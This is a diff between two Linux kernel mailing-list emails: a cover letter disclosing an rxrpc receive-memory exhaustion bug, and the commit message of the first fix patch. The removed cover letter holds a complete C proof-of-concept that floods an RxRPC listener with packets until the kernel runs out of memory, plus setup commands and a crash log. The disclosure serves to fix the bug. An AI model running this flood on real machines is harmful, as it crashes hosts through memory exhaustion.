@@ -1,63 +1,64 @@
-Received: from mail-pg1-f177.google.com (mail-pg1-f177.google.com [209.85.215.177])
+Received: from mail-pg1-f178.google.com (mail-pg1-f178.google.com [209.85.215.178])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3BF6E562603
-	for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 17:03:16 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.177
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4C661559C8E
+	for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 17:03:23 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.178
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1791997401; cv=none; b=VmprBdMBrZeJB9SnGVOB5X4rtLbzZjy9ksVQUnGD5uqvYv41S6yFprdX2VnKlFOBFLzXyDF3zGKP+7jyoQPlmz8RBQ1bVZzz86NNfkobxvsvYPKpSP9zdk1N5KjwX5LtpqHyYb/CjgeHUHEDILtgEU4Toy3vXp57bJ+t3yXN14Y=
+	t=1791997405; cv=none; b=TnQ56qC/sWI9bKs0yVZJzbAarfxf9F8VFfsDVubxwR9hmEdad0sBvLGiPiqfmeflHwtqJ03+zQxkMjBa3UyD79HL3oX7G2jdd8NZlvXEqpUOuuei4dMWH5MnUABgu6Vx9G1f9uHDVP95w6uADqWs9ZnDCgdGX+Y7y6OqYLtDlzQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1791997401; c=relaxed/simple;
-	bh=Rq0UIvIRxiR0xIfhBeAPeoW7+1jGFNc8qzeXKffX+cQ=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ULcIcqK8xNI5Pg4M8yTUwSEkBEiqNN9ujIurOQqfsxwL6g+CwvJvjkKrEqWL+eA7HAXKM0JelXWjCVPiuKD+GVHpciHOeF7x1ZognPUXp+lYx0nvd73QZftjaMYbD+lKiOFmb+o3XGb9KSoCMLduQtapVZLelZRi9NTZklaAC8s=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=DXawB+nu; arc=none smtp.client-ip=209.85.215.177
+	s=arc-20240116; t=1791997405; c=relaxed/simple;
+	bh=8XhZgrtP5VhSyyYt1prRvZzU4PR7+JnMNzXORg095Ao=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=FMSTn3g7LISrnb9HjCGqjcOY7k0khgvTyKRSvdmA6/rXgWvcZ56sV8x4jBu+ypwony9/V96MaHPaDxerHM2UVP3PueDbO6htVuIsA+IPh0CPGzp3cMapJ1FEsGLi2Jb+yUKQWHbLeJjpkaUs7gYmTFBm9aeFIamR+3+VbQIlCZg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=TtI6pYwe; arc=none smtp.client-ip=209.85.215.178
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="DXawB+nu"
-Received: by mail-pg1-f177.google.com with SMTP id 41be03b00d2f7-ccc6b11a19aso1975141a12.0
-        for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 10:03:16 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="TtI6pYwe"
+Received: by mail-pg1-f178.google.com with SMTP id 41be03b00d2f7-cd61cef87f1so841133a12.0
+        for <netdev@vger.kernel.org>; Wed, 14 Oct 2026 10:03:23 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1791997396; x=1792602196; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=YGD2GAy9TRYl9LapClsiE38NYxsqMk/txiCDOzqq+BI=;
-        b=DXawB+nuq+spg2C1cPEj3CJYH0VgN9/kiqhsyd5JjV2Q3DqD1GmqFTneIjp68c0aH2
-         NR3ZzOdFHOKe7nmQDc80/R9UMYz92W/kibiT64yov7bzaa8HYC3WYi/GWT/AM3rsE2h6
-         JCMe54bU1Sjd1I8TEwm/krN7AkmH0aBQF/DfiGjFu6CmWXWo+giVLlJPzUKVvaw02ui6
-         BNJQ8VDgJWvfJ1SRHccsLY6vP+RseBnuKdDSTYk8O4B1PJbU5czGXp2zQecyzzYi3EHs
-         gwdG7I5zbbstE1XF5LGJdKXLkNemq3CzSKmLF2Caf3V+BGR10b2Lquk1plVW3Np1VTo8
-         H0Kg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1791997396; x=1792602196;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1791997402; x=1792602202; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=YGD2GAy9TRYl9LapClsiE38NYxsqMk/txiCDOzqq+BI=;
-        b=ztOv1I9fyr/uYYbsxDEcQI6F93Rym38uOz2RM0mq/MpreMymtTEovihJfKikoGFMFK
-         WtiUi8FMf3yj0+mzYwxhYhT6rPNNumGDzvAtd0YcJSi7E2+23E0dnWDll+anm3VaUNVG
-         WsdaaHfr7lFrGhmnGrIc7ET+ofhAklPBShXIAsfTZhhJkVXsySx7YmB0Az7H1IS5miYG
-         VrgH2eLWEp73qJCQIIirPijO1yEou1NuYsTwgGMW37s4nCVwL5s+K2n7k7n7Md+f2Imn
-         h1BH7pnouV8sCyPvCPwC5FXOTQdt1ubUwarKzbhYNV2gWBI40GTA7FM8lTUF3b/PdztQ
-         WyPg==
-X-Forwarded-Encrypted: i=1; AKwUvBzJEmSvj9e1HeYDwGBhCsVy3/7tj5NMERdr6uoLKPwWDwhO3jsjitI6ZfEfSDbvtgH4bDqesX8=@vger.kernel.org
-X-Gm-Message-State: AFq9FYKaMVezayPeQgMWWOQOhK7QHr5wrOA2QspFGqAHCj+TVmoSH34X
-	nemKs7+P4IseRu+tGeXGIbxooxywjnTPykPZGMduoEC7l1MKq16Sg/Q4va44VW9y6YDDIhLzX5s
-	o73EUnQ==
-X-Gm-Gg: AYBFou0xTDQ3cdaJxtHwnBjbv3LVE8JuFMZ48qInrLPvzFU3yH+5aANgQG6Dnu3Dder
-	D32PQN9d/oIIqlfCFekr53aifY5kDCurF+AlKKd9aWEmQxUWum5Oe4kQ4Gzw7NY/RGWXWj/aEJM
-	O/pR8EZriF2pYNSsuRsvn8PQg/DajXnu7/fL6S5wfYifftblT9h3h1z8JA0nLAWfUNMw3Xo3j3k
-	yVtUlwq0pFLXawkRNh1YN/GoxSJt6u5ZwJR+uz2jommu8P/jJOrJpMdKYhVba7cb09npKP+amMx
-	ou0DDAHO7ZlrsK224u1xad3T43+51g66X5s7Iye4hw3f5Md3Tc4AB2wW7FHkGQ+jP/aqKzk28hM
-	A+2qffQI2+4fR0mFLJ5pLdpKZhgBg7ltZSLzyU32QErY74L4ssKB8SC+hjxTkfM36FJn8E+zR8R
-	wZ5XPAdoDuQs7JZZSvy0c+Qj/3G/k5QkoFaDiV/bZn2KH+7AhGqoIqtHP/dpAuQJ4kCjKF+Hazg
-	11AqorCV+u74BtJl509QXuEAXprlw==
-X-Received: by 2002:a17:90b:1d4f:b0:3ab:c80:9362 with SMTP id 98e67ed59e1d1-3ab3ac91bb4mr12960806a91.35.1791997395673;
-        Wed, 14 Oct 2026 10:03:15 -0700 (PDT)
+        bh=JQr/puKGjwAhZc21SLejI85mMl8Dhq6nGdAJWNNxORs=;
+        b=TtI6pYwe6LmZMnIjiXM8Aw2QxWhxIeEBWyP+5P8vm7ipHp1OKOe65Bob8uB7IJ0K5L
+         Ly1sobQKMHTFk8ql74MhVE09aSUMQu263YYj/2d1/KbRGQADL2m41iavI1NXAohqSxDq
+         haMa7HzXwvSwMO/dOJlPTWlvbHA6QMGfQn6Dns/k/BKQPg3knTTdPfABOkMGV9w8Sssu
+         2nje1jv7Glc08CoEqdKQZ3sfQ/zlsI3OLulSqw8vIYaRtjFOHYX3RKwDzqBxqmxxuS5C
+         CEmHWY6xkE1FuhCAQPNtHRNPJIqCX1Fh5Di17qrDQHQm9jLTuYZ3iosZQ0N7duDcmuFL
+         Br/w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1791997402; x=1792602202;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=JQr/puKGjwAhZc21SLejI85mMl8Dhq6nGdAJWNNxORs=;
+        b=lPHhagwKW4Or9rL4L76EIKSOIW1qHnbyn+4JrrsL6VVeYJGk2wuKO/2xgJ86SVCraS
+         YqPvNi9S0ysX5qS8wqzMe63fICAsp0VBdG6eZ8+KAeMgOdeLsT3jMmapBnpXFDt+Hm4F
+         zehBY4fa9LCAcVZ6tssHHc6ZJsyzLQCHW3WXIOpHHANPLP5WMlcnOjxA4r1ZAjLVDaZT
+         GzMjQ3FbpseeIZuRDyNPLbiTESdkbZaRgh8ZrRODjaq4DYUQapRbfJq1SBhC6kfzu9pb
+         lmAjhJc05wYYgAS8WgguM+cvna8P0AgEVSl5in0y/WQmnLSEPJCgmumsqVSu1p75icrZ
+         Dkqw==
+X-Forwarded-Encrypted: i=1; AKwUvByGpRJ5YewNENg9E9SAgIvFuPP//fWo8/AOe5MkXIkb+uPdZZfX3f6/+1pYf4hh+pegnt3yKz8=@vger.kernel.org
+X-Gm-Message-State: AFq9FYI9RJCC2PJXmXinbBREFXzN+0zk1DzrcQv7SH6D1zBn8TvuG5Um
+	6PLKReyoCS8TmBZmgfgylCHahPTrkmNFInrkdlejHtsdTGRWxv4be2Jfh7mN2IFG/2LV
+X-Gm-Gg: AYBFou1xWAa3T4TZPs8sjM66eYRW+Rx7baB98LE42VMVrlPBaIKtxj2FKTddSU4MqnD
+	LY+Feq0+1y2lw9V5VSRoDDBeh0qYRvsxQtvrO1mfBKpIA/pK4NdbMoMHSrLxEyojj3EbTwP+van
+	idEhbmEgN00ScrpeBnCtzwEs04MJfG/KZFTBP5gEh91g+4s6l6pI8RcIsUyRH0j9EC+ijPtkp+u
+	d2tYBDmfrWSrimk60b8IRg2X5oB1TtFvP4zyPdGr1AMJZrOhS4mAZkDhHi+s+9jH8lkXzi/gx/k
+	HcEyeoVET0VD8a3huVzKCOUQomnJFkeXhkQ9YT+B8laXbhYrFW0cZ+EwdSv/xieb37z059YlheU
+	K2R+5PN2aW2XcgYJ8+3FQrGB+X4EkS8g/bGX6v8QGXf5b1U/rzedwsUgo7lbwx5xAHjolCnqucp
+	6bUyHwmETQkfHhW9v5INcoytvavENrNZvjLmh65sJxaA4R8Cwv6rNj8caVhKEXpKRFiAoUXWHjz
+	XHOlvELQNVYOqwiQAp48+Ma+4KMD0M=
+X-Received: by 2002:a17:90b:1d03:b0:3a8:181a:2bfb with SMTP id 98e67ed59e1d1-3ab3a949a69mr11331698a91.23.1791997402001;
+        Wed, 14 Oct 2026 10:03:22 -0700 (PDT)
 Received: from 24c857d0c3be.. ([122.51.212.64])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac94792925sm190406a91.13.2026.10.14.10.03.11
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac94792925sm190406a91.13.2026.10.14.10.03.16
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 14 Oct 2026 10:03:14 -0700 (PDT)
+        Wed, 14 Oct 2026 10:03:19 -0700 (PDT)
 From: Zihan Xi <zihanx@nebusec.ai>
 To: linux-afs@lists.infradead.org,
 	netdev@vger.kernel.org
@@ -70,10 +71,12 @@ Cc: dhowells@redhat.com,
 	vega@nebusec.ai,
 	root@tr0jan.top,
 	zihanx@nebusec.ai
-Subject: [PATCH net v9 0/3] rxrpc: fix encap_rcv skb accounting exhaustion
-Date: Wed, 14 Oct 2026 16:58:33 +0000
-Message-ID: <cover.1791994057.git.zihanx@nebusec.ai>
+Subject: [PATCH net v9 1/3] rxrpc: account encapsulated packets to UDP socket
+Date: Wed, 14 Oct 2026 16:58:34 +0000
+Message-ID: <ca93aae0e2da0fb4720ab9ed6840847bae08fca0.1791994058.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.47.3
+In-Reply-To: <cover.1791994057.git.zihanx@nebusec.ai>
+References: <cover.1791994057.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -82,843 +85,259 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+rxrpc_encap_rcv() queues encapsulated UDP packets on the RxRPC local
+queue without charging them to the UDP socket. If the I/O thread cannot
+keep up, the queue can grow without bound.
 
-We found and validated an issue in net/rxrpc/io_thread.c,
-net/rxrpc/local_object.c, net/rxrpc/conn_event.c and
-net/rxrpc/input.c. The bug is reachable by a non-root user via a user
-namespace and a network namespace. We've tested it, and it should not
-affect any other functionality.
-The recorded baseline run is unpatched.
+Charge each packet against the tunnel socket under
+sk_receive_queue.lock. Derive the receive-buffer limit from the
+advertised window, retaining headroom for control and error traffic.
+Drop packets when the buffer or protocol memory budget is exhausted,
+while preserving UDP's empty-queue exception.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
+Orphan charged skbs when the I/O thread dequeues them. Since
+skb_set_owner_r() does not hold a socket reference, clear sk_user_data
+under RCU and release the socket only after purging the local queues.
 
----- details below ----
+The remaining patches bound RxRPC queues that can retain skbs after the
+UDP receive-memory charge is released.
 
-Bug details:
-
-rxrpc_encap_rcv() queues encapsulated UDP skbs on the RxRPC local queue
-without charging them to the UDP socket's receive memory. If the I/O
-thread cannot keep up, the local queue is not bounded by the UDP socket's
-receive buffer.
-
-After the I/O thread dequeues a packet, it can remain on conn->rx_queue,
-in managed RXGK OOB or pending-response queues, or in a call's
-recvmsg_queue without remaining under the UDP socket's rmem limit. The
-DATA receive sequence window advances when packets arrive, while
-rx_consumed advances only when the application reads them. Per-call
-windows therefore do not bound retained DATA across multiple calls.
-
-The unpatched net/main baseline at
-af32da41b0327b9c6a37856ba82b6760d6c8d10e was tested in a 2-vCPU,
-2-GiB QEMU guest with AF_RXRPC, AFS and KASAN enabled. The callback
-listener was active on UDP 7001, and krxrpcio/7001 was starved by
-a SCHED_FIFO priority-99 task on the same CPU. An unprivileged
-sender with UID 1001 sent IPv6 UDP datagrams for 30 seconds from
-16 threads. Each UDP payload was 36 bytes: a 28-byte RxRPC header
-and an 8-byte application payload.
-
-The run reached a system-wide OOM at 275.016 seconds. The decoded OOM
-data recorded skbuff_small_head at 521844 KB and skbuff_head_cache at
-243491 KB, while rxrpc_call_jar was 197 KB. The allocation path was the
-sender's udpv6_sendmsg() -> sock_alloc_send_pskb() -> __alloc_skb();
-this is the downstream symptom of the accumulated skb memory, rather
-than a trace at the enqueue site. The guest panicked before a packet
-count could be printed. These measured baseline results are the evidence
-for the bug. The decoded crash log is included below; it was produced with
-./scripts/decode_stacktrace.sh.
-
-This series is split into UDP receive accounting, connection/OOB queue
-budgeting, and DATA receive-queue budgeting.
-
-Changes since v8:
+Fixes: 446b3e14525b ("rxrpc: Move packet reception processing into I/O thread")
+Cc: stable@vger.kernel.org
+Link: https://lore.kernel.org/all/cover.1791428529.git.zihanx@nebusec.ai/
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: LLM
+Co-developed-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+---
+changes in v9:
   - Split the fix into UDP accounting, connection/OOB queue budgeting,
     and DATA receive-queue budgeting patches.
-  - Attribute the aggregate DATA accounting gap to 248f219cb8bc.
-  - Clarify that each 36-byte UDP payload contains a 28-byte RxRPC
-    header and an 8-byte application payload.
-  - Apply netdev reverse-xmas ordering to the receive-budget helper.
-  - Include the decoded baseline OOM and panic output in the cover letter.
-Link: https://lore.kernel.org/all/cover.1791428529.git.zihanx@nebusec.ai/
+  - Correct the Fixes attribution for the asynchronous receive queues.
+  - v8 Link: https://lore.kernel.org/all/cover.1791428529.git.zihanx@nebusec.ai/
+changes in v8:
+  - Rebase onto net/main at 6d25ffca055a and resend after the previous
+    posting became stale.
+  - v7 Link: https://lore.kernel.org/all/cover.1790427022.git.zihanx@nebusec.ai/
+changes in v7:
+  - Rebase the fix onto net/main at a7bfaba4823e.
+  - v6 Link: https://lore.kernel.org/all/cover.1789608557.git.zihanx@nebusec.ai/
+changes in v6:
+  - Refresh the tunnel socket receive-buffer cap when rxrpc_rx_window_size
+    increases, without shrinking an existing socket.
+  - Distinguish socket receive-buffer exhaustion from protocol memory
+    accounting failures in the drop reason.
+  - Cap the window-derived value at sysctl_rmem_max and only grow an
+    existing sk_rcvbuf.
+  - v5 Link: https://lore.kernel.org/all/cover.1789273347.git.zihanx@nebusec.ai/
+changes in v5:
+  - Size the tunnel sk_rcvbuf from one advertised DATA window, with
+    additional headroom for ACKs and ICMP, capped by sysctl_rmem_max.
+  - Drop the dst instead of skb_dst_force(); keep skb->dev = NULL.
+  - Document the runtime receive-window sizing limitation.
+  - v4 Link: https://lore.kernel.org/all/cover.1788878590.git.zihanx@nebusec.ai/
+changes in v4:
+  - Serialize UDP rmem charge and uncharge with sk_receive_queue.lock.
+  - Orphan only PACKET skbs charged by encap_rcv(); preserve error skb
+    ownership.
+  - Clarify the callback-listener setup and distinguish the unprivileged
+    flood from extra conditions used for the recorded OOM.
+  - v3 Link: https://lore.kernel.org/all/cover.1788539302.git.zihanx@nebusec.ai/
+changes in v3:
+  - Orphan skbs when the I/O thread dequeues them so UDP rmem ownership
+    does not follow packets onto call or connection queues.
+  - Clarify the affected source files and the recorded OOM context.
+  - v2 Link: https://lore.kernel.org/all/cover.1785339953.git.zihanx@nebusec.ai/
+changes in v2:
+  - Use sk_drops_inc(), correct the Fixes attribution, and refresh the
+    baseline reproducer and decoded crash log.
+  - Explain why packetdrill does not express the sustained unique-call
+    flood used by this reproducer.
+  - v1 Link: https://lore.kernel.org/all/cover.1784742007.git.zihanx@nebusec.ai/
+---
+ net/rxrpc/ar-internal.h  |  1 +
+ net/rxrpc/io_thread.c    | 61 ++++++++++++++++++++++++++++++++++++++--
+ net/rxrpc/local_object.c | 24 ++++++++++++++--
+ 3 files changed, 82 insertions(+), 4 deletions(-)
 
-Reproducer:
-
-    gcc -O2 -static -pthread -o poc_rxrpc_mem poc.c
-    unshare -Urn ./poc_rxrpc_mem -t 16 -s 30 -l 8
-
-packetdrill is not used here because the trigger depends on a sustained
-multi-threaded flood with unique call IDs and deliberate I/O-thread
-starvation, rather than a finite deterministic packet sequence.
-
-The namespace command exercises the flood as a non-root user in a user
-and network namespace. The OOM measurements above additionally used
-privileged setup to pin krxrpcio/7001 and run a SCHED_FIFO hog on the
-other CPU; those conditions are not part of the non-root reachability
-claim. For the recorded run, an AFS callback listener was already active
-on UDP 7001 and the PoC reused it with -e:
-
-    sysctl -w vm.panic_on_oom=1
-    sysctl -w vm.overcommit_memory=2
-    sysctl -w vm.overcommit_ratio=50
-    sysctl -w kernel.panic_on_warn=0
-    IO_PID=$(ps -eT -o tid=,comm= | awk '$2 == "krxrpcio/7001" {print $1; exit}')
-    taskset -p 2 "$IO_PID"
-    taskset -c 1 chrt -f 99 /bin/sh -c 'while :; do :; done' &
-    ip link set lo up
-    taskset -c 0 runuser -u test_user -- ./poc_rxrpc_mem -e -t 16 -s 30 -l 8
-
-The privileged setup brings lo up before runuser. The PoC then skips
-SIOCSIFFLAGS because lo is already up, so test_user does not need
-CAP_NET_ADMIN for the recorded sender run.
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-#define _GNU_SOURCE
-#include <arpa/inet.h>
-#include <errno.h>
-#include <net/if.h>
-#include <netinet/in.h>
-#include <pthread.h>
-#include <sched.h>
-#include <signal.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <time.h>
-#include <unistd.h>
-
-#define RXRPC_PACKET_TYPE_DATA 1
-#define RXRPC_CLIENT_INITIATED 0x01
-#define RXRPC_SERVICE_ID 1
-#ifndef AF_RXRPC
-#define AF_RXRPC 33
-#endif
-#define AFS_CB_CALLBACK_OP 204
-#define DEFAULT_PORT 7001
-#define DEFAULT_THREADS 4
-#define DEFAULT_SECONDS 20
-#define DEFAULT_PAYLOAD 8
-
-struct __attribute__((packed)) rxrpc_wire_header {
-	uint32_t epoch;
-	uint32_t cid;
-	uint32_t callNumber;
-	uint32_t seq;
-	uint32_t serial;
-	uint8_t type;
-	uint8_t flags;
-	uint8_t userStatus;
-	uint8_t securityIndex;
-	uint16_t reserved;
-	uint16_t serviceId;
-};
-
-struct rxrpc_sockaddr {
-	sa_family_t srx_family;
-	uint16_t srx_service;
-	uint16_t transport_type;
-	uint16_t transport_len;
-	union {
-		sa_family_t family;
-		struct sockaddr_in sin;
-		struct sockaddr_in6 sin6;
-	} transport;
-};
-
-struct thread_args {
-	struct sockaddr_in6 dst;
-	int seconds;
-	size_t payload_len;
-	uint32_t cid_seed;
-	unsigned long sent;
-};
-
-static volatile sig_atomic_t stop_flag;
-
-static void on_alarm(int sig)
-{
-	(void)sig;
-	stop_flag = 1;
-}
-
-static void *sender_thread(void *arg)
-{
-	struct thread_args *ta = arg;
-	int fd;
-	char *packet;
-	struct rxrpc_wire_header *hdr;
-	uint32_t *op;
-	uint32_t *count;
-	uint32_t seq = 1;
-	uint32_t cid = ta->cid_seed;
-
-	fd = socket(AF_INET6, SOCK_DGRAM, 0);
-	if (fd < 0) {
-		perror("socket");
-		return NULL;
-	}
-
-	packet = malloc(sizeof(*hdr) + ta->payload_len);
-	if (!packet) {
-		perror("malloc");
-		close(fd);
-		return NULL;
-	}
-	memset(packet + sizeof(*hdr), 0, ta->payload_len);
-	hdr = (struct rxrpc_wire_header *)packet;
-	hdr->callNumber = htonl(1);
-	hdr->type = RXRPC_PACKET_TYPE_DATA;
-	hdr->flags = RXRPC_CLIENT_INITIATED;
-	hdr->userStatus = 0;
-	hdr->securityIndex = 0;
-	hdr->reserved = 0;
-	hdr->serviceId = htons(RXRPC_SERVICE_ID);
-	op = (uint32_t *)(packet + sizeof(*hdr));
-	*op = htonl(AFS_CB_CALLBACK_OP);
-	if (ta->payload_len >= 8) {
-		count = op + 1;
-		*count = htonl(1);
-	}
-
-	/*
-	 * Each datagram is a new incoming RxRPC call (seq=1, unique cid).
-	 * That makes the I/O thread do full incoming-call setup, so it
-	 * falls behind encap_rcv and local->rx_queue can grow.
-	 */
-	while (!stop_flag) {
-		hdr->epoch = htonl(0x80000000u | cid);
-		hdr->cid = htonl(cid << 2);
-		hdr->seq = htonl(1);
-		hdr->serial = htonl(seq);
-		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,
-			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >= 0) {
-			ta->sent++;
-			seq++;
-			cid += 32;
-		}
-	}
-
-	free(packet);
-	close(fd);
-	return NULL;
-}
-
-static int bring_up_lo(void)
-{
-	struct ifreq ifr;
-	int fd;
-
-	fd = socket(AF_INET, SOCK_DGRAM, 0);
-	if (fd < 0)
-		return -1;
-	memset(&ifr, 0, sizeof(ifr));
-	strcpy(ifr.ifr_name, "lo");
-	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
-		close(fd);
-		return -1;
-	}
-	if (ifr.ifr_flags & IFF_UP) {
-		close(fd);
-		return 0;
-	}
-	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
-	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
-		close(fd);
-		return -1;
-	}
-	close(fd);
-	return 0;
-}
-
-static int start_rxrpc_listener(uint16_t port)
-{
-	struct rxrpc_sockaddr srx;
-	int fd;
-
-	fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET6);
-	if (fd < 0)
-		return -1;
-
-	memset(&srx, 0, sizeof(srx));
-	srx.srx_family = AF_RXRPC;
-	srx.srx_service = RXRPC_SERVICE_ID;
-	srx.transport_type = SOCK_DGRAM;
-	srx.transport_len = sizeof(struct sockaddr_in6);
-	srx.transport.sin6.sin6_family = AF_INET6;
-	srx.transport.sin6.sin6_port = htons(port);
-
-	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0 ||
-	    listen(fd, 1) < 0) {
-		close(fd);
-		return -1;
-	}
-
-	return fd;
-}
-
-static void usage(const char *prog)
-{
-	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [-l payload_len] [-e]\n", prog);
-}
-
-int main(int argc, char **argv)
-{
-	struct sockaddr_in6 dst = {
-		.sin6_family = AF_INET6,
-		.sin6_port = htons(DEFAULT_PORT),
-	};
-	const char *addr = "::1";
-	int threads = DEFAULT_THREADS;
-	int seconds = DEFAULT_SECONDS;
-	size_t payload_len = DEFAULT_PAYLOAD;
-	pthread_t *tids;
-	struct thread_args *args;
-	unsigned long total = 0;
-	int listener_fd;
-	int use_existing_listener = 0;
-	int opt;
-
-	while ((opt = getopt(argc, argv, "a:p:t:s:l:eh")) != -1) {
-		switch (opt) {
-		case 'a':
-			addr = optarg;
-			break;
-		case 'p':
-			dst.sin6_port = htons((uint16_t)strtoul(optarg, NULL, 0));
-			break;
-		case 't':
-			threads = atoi(optarg);
-			break;
-		case 's':
-			seconds = atoi(optarg);
-			break;
-		case 'l':
-			payload_len = strtoul(optarg, NULL, 0);
-			break;
-		case 'e':
-			use_existing_listener = 1;
-			break;
-		default:
-			usage(argv[0]);
-			return 1;
-		}
-	}
-
-	if (threads <= 0 || seconds <= 0 || payload_len < 4 || payload_len > 65000) {
-		usage(argv[0]);
-		return 1;
-	}
-	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) != 1) {
-		perror("inet_pton");
-		return 1;
-	}
-	if (bring_up_lo() < 0) {
-		perror("bring_up_lo");
-		return 1;
-	}
-
-	listener_fd = -1;
-	if (!use_existing_listener) {
-		listener_fd = start_rxrpc_listener(ntohs(dst.sin6_port));
-		if (listener_fd < 0) {
-			perror("start_rxrpc_listener");
-			return 1;
-		}
-	}
-
-	signal(SIGALRM, on_alarm);
-	alarm(seconds);
-
-	tids = calloc((size_t)threads, sizeof(*tids));
-	args = calloc((size_t)threads, sizeof(*args));
-	if (!tids || !args) {
-		perror("calloc");
-		return 1;
-	}
-
-	pthread_attr_t attr;
-	if (pthread_attr_init(&attr) != 0) {
-		perror("pthread_attr_init");
-		return 1;
-	}
-	if (pthread_attr_setstacksize(&attr, 64 * 1024) != 0) {
-		perror("pthread_attr_setstacksize");
-		return 1;
-	}
-
-	for (int i = 0; i < threads; i++) {
-		args[i].dst = dst;
-		args[i].seconds = seconds;
-		args[i].payload_len = payload_len;
-		args[i].cid_seed = 1 + (uint32_t)i;
-		if (pthread_create(&tids[i], &attr, sender_thread, &args[i]) != 0) {
-			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));
-			stop_flag = 1;
-			threads = i;
-			break;
-		}
-	}
-	pthread_attr_destroy(&attr);
-
-	for (int i = 0; i < threads; i++) {
-		pthread_join(tids[i], NULL);
-		total += args[i].sent;
-	}
-
-	printf("sent_packets=%lu payload_len=%zu threads=%d duration=%d\n",
-	       total, payload_len, threads, seconds);
-	free(args);
-	free(tids);
-	if (listener_fd >= 0)
-		close(listener_fd);
-	return 0;
-}
-------END poc.c--------
-
-----BEGIN crash log----
-[  275.016678][ T9427] poc_rxrpc_mem invoked oom-killer: gfp_mask=0x40cc0(GFP_KERNEL|__GFP_COMP), order=0, oom_score_adj=0
-[  275.016736][ T9427] CPU: 0 UID: 1001 PID: 9427 Comm: poc_rxrpc_mem Not tainted 7.3.0-rc6+ #1 PREEMPT(full) 
-[  275.016747][ T9427] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  275.016751][ T9427] Call Trace:
-[  275.016779][ T9427]  <TASK>
-[  275.016790][ T9427]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
-[  275.016925][ T9427]  dump_stack (lib/dump_stack.c:129)
-[  275.016932][ T9427]  dump_header (mm/oom_kill.c:464)
